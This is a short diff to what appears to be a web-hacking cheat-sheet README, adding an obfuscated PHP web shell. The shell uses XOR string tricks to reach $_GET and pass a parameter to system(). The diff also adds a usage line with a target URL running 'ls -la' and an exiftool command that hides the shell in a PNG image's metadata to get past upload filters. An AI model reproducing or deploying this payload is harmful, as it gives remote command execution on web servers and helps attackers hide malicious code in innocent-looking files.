@@ -8,3 +8,12 @@
   <li>[ &#x274C;  ] Xss payloads   </li>
   <li>[ &#x1F50D;  ] SQL injection - Characters   </li>
 </ul>
+
+
+# Use <TARGET>/file.php?_=system&__=ls -la
+
+SHELL = {`<?php $_="{";$_=($_^"<").($_^">;").($_^"/");?><?=${'_'.$_}["_"](${'_'.$_}["__"]);`}
+
+##### Download <img height="33" width="33" src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"><a href="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">Img<a> 
+
+ `exiftool -Comment="SHELL __halt_compiler();" googleg_standard_color_128dp.png`
